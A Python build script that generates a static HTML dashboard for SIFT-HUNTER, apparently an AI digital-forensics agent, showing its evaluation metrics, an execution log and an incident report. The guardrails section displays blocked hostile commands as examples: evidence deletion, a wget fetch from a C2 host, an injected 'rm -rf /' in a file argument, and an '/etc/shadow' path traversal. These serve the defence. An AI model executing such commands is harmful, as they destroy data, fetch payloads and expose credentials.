"""
Build a self-contained static dashboard (web/index.html) from SIFT-HUNTER's REAL outputs:
the measured evaluation, a real timestamped agent execution trail, and the incident report.

    python web/build.py      # regenerates web/index.html

The output is a single HTML file with all data inlined, so it opens from file://, serves
as a static site, and deploys to any static host (Vercel) with zero backend.
"""
from __future__ import annotations

import base64
import json
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
WEB = Path(__file__).resolve().parent

ev = json.loads((ROOT / "benchmarks/results/evaluation.json").read_text())
report_md = (ROOT / "benchmarks/cases/case001/sample_report.md").read_text()
log = [json.loads(l) for l in (ROOT / "benchmarks/cases/case001/execution_log.jsonl").read_text().splitlines() if l.strip()]


def _parse(ts: str) -> datetime:
    return datetime.fromisoformat(ts.replace("Z", "+00:00"))


t0 = _parse(log[0]["timestamp"])
timeline = [
    {
        "t": round((_parse(r["timestamp"]) - t0).total_seconds(), 1),
        "agent": r.get("agent", ""),
        "action": r.get("action", ""),
        "phase": r.get("phase", ""),
        "iter": r.get("iteration", 0),
        "details": (r.get("details") or "")[:180],
    }
    for r in log
]

from collections import Counter
acts = Counter(r.get("action", "") for r in log)
log_stats = {
    "events": len(log),
    "span_s": round((_parse(log[-1]["timestamp"]) - t0).total_seconds(), 0),
    "verification_rounds": acts.get("VERIFICATION_COMPLETE", 0),
    "corrections": acts.get("correction_issued", 0),
    "findings": acts.get("finding_created", 0),
    "tool_calls": acts.get("tool_call", 0),
}

# Merge every case's SHA-256 manifest for the chain-of-custody section.
custody = {}
for c in ev["cases"]:
    for fn, h in c.get("chain_of_custody_sha256", {}).items():
        custody[f"{c['case_id']}/{fn}"] = h

DATA = {
    "eval": ev,
    "timeline": timeline,
    "logStats": log_stats,
    "custody": custody,
    "reportB64": base64.b64encode(report_md.encode()).decode(),
}

TEMPLATE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>SIFT-HUNTER - Autonomous AI Incident Response</title>
<meta name="description" content="An autonomous AI agent that does digital forensics and catches its own hallucinations. Measured 100% precision / 86% recall on the canonical zeus.vmem and cridex.vmem samples."/>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='42' fill='none' stroke='%233fe6d0' stroke-width='7'/%3E%3Ccircle cx='50' cy='50' r='6' fill='%233fe6d0'/%3E%3Cpath d='M50 4v20M50 76v20M4 50h20M76 50h20' stroke='%233fe6d0' stroke-width='7'/%3E%3C/svg%3E"/>
<script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
<style>
  :root{
    --ink:#05070d; --panel:#0b0f18; --panel2:#0e1320; --line:#1b2436;
    --text:#eef2f8; --muted:#93a0b5; --dim:#5d6b82;
    --cyan:#3fe6d0; --green:#46e08a; --amber:#f5b14c; --red:#ff6b6b;
  }
  *{margin:0;padding:0;box-sizing:border-box}
  html{scroll-behavior:smooth}
  body{
    background:var(--ink); color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;
    line-height:1.6; -webkit-font-smoothing:antialiased;
    background-image:
      radial-gradient(900px 500px at 85% -5%, rgba(63,230,208,.10), transparent 60%),
      radial-gradient(800px 520px at -5% 8%, rgba(54,110,224,.10), transparent 60%);
    background-attachment:fixed;
  }
  .wrap{max-width:1060px;margin:0 auto;padding:0 24px}
  code,.mono{font-family:ui-monospace,"SF Mono",Menlo,Consolas,monospace}
  a{color:var(--cyan);text-decoration:none}
  a:hover{text-decoration:underline}

  /* nav */
  nav{position:sticky;top:0;z-index:20;backdrop-filter:blur(10px);
    background:rgba(5,7,13,.72);border-bottom:1px solid var(--line)}
  nav .wrap{display:flex;align-items:center;gap:20px;height:58px}
  nav .brand{font-weight:800;letter-spacing:-.02em}
  nav .brand .c{color:var(--cyan)}
  nav .links{margin-left:auto;display:flex;gap:22px;font-size:14px}
  nav .links a{color:var(--muted)} nav .links a:hover{color:var(--text);text-decoration:none}
  nav .repo{border:1px solid rgba(63,230,208,.4);border-radius:999px;padding:6px 14px;color:var(--cyan);font-size:13px}
  @media(max-width:740px){nav .links{display:none}}

  /* hero */
  header.hero{padding:64px 0 28px}
  .eyebrow{font-family:ui-monospace,monospace;font-size:13px;letter-spacing:.28em;text-transform:uppercase;color:var(--muted);display:flex;gap:12px;align-items:center}
  .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 12px var(--green)}
  h1.title{font-size:clamp(44px,8vw,84px);line-height:.95;letter-spacing:-.03em;font-weight:800;margin:18px 0 14px}
  h1.title .c{color:var(--cyan)}
  .lede{font-size:clamp(18px,2.4vw,23px);color:#cdd6e4;max-width:760px}
  .lede b{color:#fff}
  .chips{display:flex;flex-wrap:wrap;gap:12px;margin-top:28px}
  .chip{background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.012));border:1px solid var(--line);border-radius:14px;padding:14px 18px;min-width:140px}
  .chip .n{font-size:26px;font-weight:800;letter-spacing:-.02em}
  .chip .n.cyan{color:var(--cyan)} .chip .n.green{color:var(--green)}
  .chip .l{font-size:13px;color:var(--muted);margin-top:2px}
  .cta{display:flex;gap:12px;margin-top:30px;flex-wrap:wrap}
  .btn{border-radius:12px;padding:12px 20px;font-weight:700;font-size:15px;border:1px solid var(--line)}
  .btn.primary{background:var(--cyan);color:#04201c;border-color:var(--cyan)}
  .btn.ghost{background:transparent;color:var(--text)}

  /* sections */
  section{padding:54px 0;border-top:1px solid var(--line)}
  .kicker{font-family:ui-monospace,monospace;font-size:12px;letter-spacing:.24em;text-transform:uppercase;color:var(--cyan)}
  h2{font-size:clamp(28px,4vw,40px);line-height:1.05;letter-spacing:-.02em;font-weight:800;margin:8px 0 10px}
  .sub{color:var(--muted);max-width:760px;margin-bottom:26px}

  .card{background:var(--panel);border:1px solid var(--line);border-radius:18px;padding:22px}
  .grid2{display:grid;grid-template-columns:1.3fr 1fr;gap:18px}
  @media(max-width:820px){.grid2{grid-template-columns:1fr}}

  table{width:100%;border-collapse:collapse;font-size:14px}
  th,td{text-align:left;padding:11px 12px;border-bottom:1px solid var(--line)}
  th{color:var(--muted);font-weight:600;font-size:12px;letter-spacing:.04em;text-transform:uppercase}
  td.mono{font-variant-numeric:tabular-nums}
  .ok{color:var(--green);font-weight:700}
  .tag{display:inline-block;font-family:ui-monospace,monospace;font-size:12px;border:1px solid var(--line);border-radius:6px;padding:2px 7px;color:var(--cyan);background:rgba(63,230,208,.06)}

  .bars{display:flex;flex-direction:column;gap:12px}
  .bar{display:grid;grid-template-columns:120px 1fr 56px;align-items:center;gap:12px;font-size:14px}
  .bar .track{height:9px;border-radius:6px;background:#16203100;border:1px solid var(--line);overflow:hidden}
  .bar .fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--green))}
  .bar .pct{text-align:right;color:var(--muted);font-variant-numeric:tabular-nums}

  .flow{display:flex;flex-wrap:wrap;align-items:center;gap:8px;margin:6px 0 18px}
  .node{border:1px solid var(--line);border-radius:10px;padding:8px 12px;font-size:13px;font-weight:600;background:var(--panel2)}
  .node.star{border-color:rgba(63,230,208,.55);color:var(--cyan);box-shadow:0 0 18px rgba(63,230,208,.12)}
  .arrow{color:var(--dim)}
  .loop{font-family:ui-monospace,monospace;font-size:12px;color:var(--amber);margin-left:4px}

  .term{background:#070a11;border:1px solid var(--line);border-radius:14px;overflow:hidden}
  .term .head{display:flex;gap:7px;padding:11px 14px;border-bottom:1px solid var(--line);align-items:center}
  .term .head .b{width:11px;height:11px;border-radius:50%;background:#28324a}
  .term .head .t{margin-left:8px;font-family:ui-monospace,monospace;font-size:12px;color:var(--muted)}
  .log{max-height:380px;overflow:auto;font-family:ui-monospace,monospace;font-size:12.5px;line-height:1.85;padding:12px 14px}
  .log .row{display:grid;grid-template-columns:54px 110px 1fr;gap:10px;padding:2px 0}
  .log .ts{color:var(--dim)} .log .ag{color:var(--cyan)}
  .log .ac{color:#cdd6e4}
  .log .row.c .ac{color:var(--amber);font-weight:700}
  .log .row.v .ag{color:var(--green)}
  .log .row.f .ag{color:var(--muted)}

  .spot{border-left:3px solid var(--amber);background:var(--panel2);border-radius:0 14px 14px 0;padding:18px 22px;font-size:15px;color:#dbe3f0}
  .spot .q{color:#fff}
  .statrow{display:flex;flex-wrap:wrap;gap:22px;margin-top:16px}
  .statrow .s .n{font-size:24px;font-weight:800;color:var(--cyan)}
  .statrow .s .l{font-size:12px;color:var(--muted)}

  /* report markdown */
  .report{background:var(--panel);border:1px solid var(--line);border-radius:18px;max-height:620px;overflow:auto}
  .report .md{padding:26px 30px;font-size:14.5px}
  .report .md h1{font-size:24px;margin:0 0 4px} .report .md h2{font-size:18px;margin:24px 0 8px;color:var(--cyan);border:0;letter-spacing:0}
  .report .md h3{font-size:15px;margin:18px 0 4px}
  .report .md table{margin:10px 0} .report .md code{background:#0a0e17;border:1px solid var(--line);border-radius:5px;padding:1px 5px;font-size:12.5px}
  .report .md pre{background:#070a11;border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px}
  .report .md hr{border:0;border-top:1px solid var(--line);margin:18px 0}
  .report .md a{color:var(--cyan)} .report .md blockquote{border-left:3px solid var(--line);padding-left:12px;color:var(--muted)}

  .sec-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
  @media(max-width:740px){.sec-grid{grid-template-columns:1fr}}
  .checkline{display:flex;gap:10px;align-items:flex-start;font-family:ui-monospace,monospace;font-size:13px;padding:8px 0;border-bottom:1px solid var(--line)}
  .checkline .v{font-weight:700}
  .blocked{color:var(--red)} .allowed{color:var(--green)}

  .custody{font-family:ui-monospace,monospace;font-size:12px}
  .custody .row{display:grid;grid-template-columns:240px 1fr;gap:14px;padding:7px 0;border-bottom:1px solid var(--line)}
  .custody .h{color:var(--dim);word-break:break-all}
  @media(max-width:740px){.custody .row{grid-template-columns:1fr}}

  footer{padding:44px 0;border-top:1px solid var(--line);color:var(--muted);font-size:14px}
  footer .cmds{background:#070a11;border:1px solid var(--line);border-radius:12px;padding:14px 16px;font-family:ui-monospace,monospace;font-size:12.5px;color:#cdd6e4;margin:14px 0;white-space:pre;overflow:auto}
</style>
</head>
<body>
<nav><div class="wrap">
  <span class="brand">SIFT<span class="c">-HUNTER</span></span>
  <span class="links">
    <a href="#eval">Evaluation</a>
    <a href="#run">Inside a run</a>
    <a href="#report">Report</a>
    <a href="#security">Guardrails</a>
  </span>
  <a class="repo" href="https://github.com/svaka2000/SIFT-HUNTER" target="_blank" rel="noopener">GitHub</a>
</div></nav>

<header class="hero"><div class="wrap">
  <div class="eyebrow"><span class="dot"></span> Autonomous Incident Response <span style="color:#39465c">/</span> SANS SIFT Workstation</div>
  <h1 class="title">SIFT<span class="c">-HUNTER</span></h1>
  <div class="lede">An autonomous AI agent that runs full digital forensics on disk and memory, and <b>catches its own hallucinations</b> before they reach the report.</div>
  <div class="chips" id="chips"></div>
  <div class="cta">
    <a class="btn primary" href="#eval">See the measured proof</a>
    <a class="btn ghost" href="#run">Watch a real run</a>
  </div>
</div></header>

<section id="eval"><div class="wrap">
  <div class="kicker">Measured, not claimed</div>
  <h2>Evaluated on real malware memory</h2>
  <p class="sub">Scored against the canonical Volatility samples every DFIR analyst knows, <b>zeus.vmem</b> and <b>cridex.vmem</b>, with publicly documented ground truth. The deterministic detection layer, no LLM and no API key required.</p>
  <div class="grid2">
    <div class="card"><table id="evalTable"></table></div>
    <div class="card">
      <div style="font-size:13px;color:var(--muted);margin-bottom:14px">Per-category recall</div>
      <div class="bars" id="catBars"></div>
    </div>
  </div>
</div></section>

<section id="run"><div class="wrap">
  <div class="kicker">The tiebreaker</div>
  <h2>It corrects itself, on real evidence</h2>
  <p class="sub">A Verifier agent re-checks every finding against the raw tool output. When it catches a claim the evidence does not support, it routes the finding back to be re-examined. Here is one real run.</p>
  <div class="flow">
    <span class="node">Triage</span><span class="arrow">&rarr;</span>
    <span class="node">Disk</span><span class="arrow">&rarr;</span>
    <span class="node">Memory</span><span class="arrow">&rarr;</span>
    <span class="node">Correlator</span><span class="arrow">&rarr;</span>
    <span class="node star">Verifier &#9733;</span><span class="arrow">&rarr;</span>
    <span class="node">Reporter</span>
    <span class="loop">&#8617; loops back on a bad finding</span>
  </div>
  <div class="spot">
    <span class="q">"Per correction review, the Meterpreter/framework attribution is an inference and is not directly confirmed by tool output; the connection itself is confirmed. The type has been corrected from LATERAL_MOVEMENT to reflect the outbound C2 nature."</span>
    <div style="color:var(--muted);font-size:13px;margin-top:8px">- the Verifier, downgrading an over-claimed finding in the committed report</div>
    <div class="statrow" id="runStats"></div>
  </div>
  <div style="height:18px"></div>
  <div class="term">
    <div class="head"><span class="b"></span><span class="b"></span><span class="b"></span><span class="t">execution_log.jsonl &mdash; real timestamped agent audit trail</span></div>
    <div class="log" id="log"></div>
  </div>
</div></section>

<section id="report"><div class="wrap">
  <div class="kicker">The output</div>
  <h2>The incident report it produced</h2>
  <p class="sub">A structured report with confidence levels, MITRE ATT&amp;CK mapping, an attack timeline, and a self-assessment. Verbatim from a real run.</p>
  <div class="report"><div class="md" id="report"></div></div>
</div></section>

<section id="security"><div class="wrap">
  <div class="kicker">Architectural, not a prompt</div>
  <h2>Guardrails, tested for bypass</h2>
  <p class="sub">Destructive and exfiltration actions are blocked in Python before any command runs. 20 adversarial bypass attempts, all refused.</p>
  <div class="sec-grid">
    <div class="card">
      <div class="checkline"><span class="v blocked">BLOCKED</span><code>rm -rf /evidence</code></div>
      <div class="checkline"><span class="v blocked">BLOCKED</span><code>wget http://c2/payload</code></div>
      <div class="checkline"><span class="v blocked">BLOCKED</span><code>vol3 -f "mem.dmp; rm -rf /"</code></div>
      <div class="checkline" style="border:0"><span class="v blocked">BLOCKED</span><code>../../etc/shadow</code></div>
    </div>
    <div class="card">
      <div class="checkline"><span class="v allowed">ALLOWED</span><code>vol3 -f mem.dmp pslist</code></div>
      <div class="checkline"><span class="v allowed">ALLOWED</span><code>MFTECmd -f $MFT.csv</code></div>
      <div class="checkline" style="border:0;color:var(--muted)">allow-list + path validation + shell=False, enforced before execution</div>
    </div>
  </div>
  <div style="height:24px"></div>
  <div class="kicker">Forensic soundness</div>
  <h2 style="font-size:26px">Chain of custody</h2>
  <p class="sub">Every evidence file is SHA-256 hashed on each run, so a reviewer can prove nothing was altered.</p>
  <div class="card custody" id="custody"></div>
</div></section>

<footer><div class="wrap">
  <div style="font-weight:700;color:var(--text)">Reproduce everything &mdash; no API key needed:</div>
  <div class="cmds">git clone https://github.com/svaka2000/SIFT-HUNTER &amp;&amp; cd SIFT-HUNTER &amp;&amp; pip install -e .
python -m benchmarks.evaluate                 # 100% precision / 86% recall on zeus + cridex
python -m benchmarks.hallucination_benchmark  # 93% catch / 0% false positives
pytest tests/test_security_bypass.py          # 20 bypass attempts, all refused</div>
  <div>SIFT-HUNTER &middot; SANS FIND EVIL! &middot; <a href="https://github.com/svaka2000/SIFT-HUNTER" target="_blank" rel="noopener">github.com/svaka2000/SIFT-HUNTER</a></div>
</div></footer>

<script>/*DATA*/</script>
<script>
const E = DATA.eval, O = E.overall, L = DATA.logStats;
const pct = x => (x*100).toFixed(0)+'%';

// hero chips
document.getElementById('chips').innerHTML = [
  ['n cyan', pct(O.precision), 'precision (0 FP)'],
  ['n', pct(O.recall), 'recall'],
  ['n green', O.f1.toFixed(2), 'F1 score'],
  ['n cyan', '93% / 0%', 'hallucination catch'],
  ['n', '20', 'bypass attempts refused'],
  ['n green', '244', 'tests passing'],
].map(([cls,n,l])=>`<div class="chip"><div class="${cls}">${n}</div><div class="l">${l}</div></div>`).join('');

// eval table
const rows = E.cases.map(c=>`<tr>
  <td><b>${c.case_id}</b><div style="font-size:11px;color:var(--dim)">${c.source||'synthetic'}</div></td>
  <td class="mono">${c.iocs_found}/${c.iocs_total}</td>
  <td class="mono">${c.false_positives}</td>
  <td class="mono ok">${pct(c.metrics_all.precision)}</td>
  <td class="mono">${pct(c.metrics_all.recall)}</td>
  <td class="mono">${c.metrics_all.f1.toFixed(2)}</td></tr>`).join('');
document.getElementById('evalTable').innerHTML =
  `<thead><tr><th>Case</th><th>IOCs</th><th>FP</th><th>Precision</th><th>Recall</th><th>F1</th></tr></thead>
   <tbody>${rows}<tr style="font-weight:700">
     <td>OVERALL</td><td class="mono">${O.iocs_found}/${O.total_iocs}</td><td class="mono ok">${O.false_positives}</td>
     <td class="mono ok">${pct(O.precision)}</td><td class="mono">${pct(O.recall)}</td><td class="mono">${O.f1.toFixed(2)}</td></tr></tbody>`;

// per-category bars
const cats = O.per_category;
document.getElementById('catBars').innerHTML = Object.keys(cats).sort().map(k=>{
  const v = cats[k]; const p = v.recall*100;
  return `<div class="bar"><div>${k}</div><div class="track"><div class="fill" style="width:${p}%"></div></div><div class="pct">${v.found}/${v.total}</div></div>`;
}).join('');

// run stats
document.getElementById('runStats').innerHTML = [
  [L.events,'audit events'],[L.verification_rounds,'verification rounds'],
  [L.corrections,'corrections issued'],[L.tool_calls,'tool calls'],
].map(([n,l])=>`<div class="s"><div class="n">${n}</div><div class="l">${l}</div></div>`).join('');

// execution log
document.getElementById('log').innerHTML = DATA.timeline.map(r=>{
  const cls = r.action==='correction_issued'?'c':(r.action.includes('VERIFICATION')?'v':(r.action==='finding_created'?'f':''));
  const ac = r.details ? r.action+' &middot; '+r.details : r.action;
  return `<div class="row ${cls}"><span class="ts">+${r.t}s</span><span class="ag">${r.agent||'-'}</span><span class="ac">${ac.replace(/</g,'&lt;')}</span></div>`;
}).join('');

// report markdown
const md = new TextDecoder().decode(Uint8Array.from(atob(DATA.reportB64), c=>c.charCodeAt(0)));
document.getElementById('report').innerHTML = marked.parse(md.replace(/^<!--[\s\S]*?-->/,'').trim());

// custody
document.getElementById('custody').innerHTML = Object.entries(DATA.custody).map(([f,h])=>
  `<div class="row"><div>${f}</div><div class="h">${h}</div></div>`).join('');
</script>
</body>
</html>"""

html = TEMPLATE.replace("/*DATA*/", "const DATA = " + json.dumps(DATA) + ";")
(WEB / "index.html").write_text(html)
print(f"wrote {WEB/'index.html'} ({len(html)//1024} KB)")
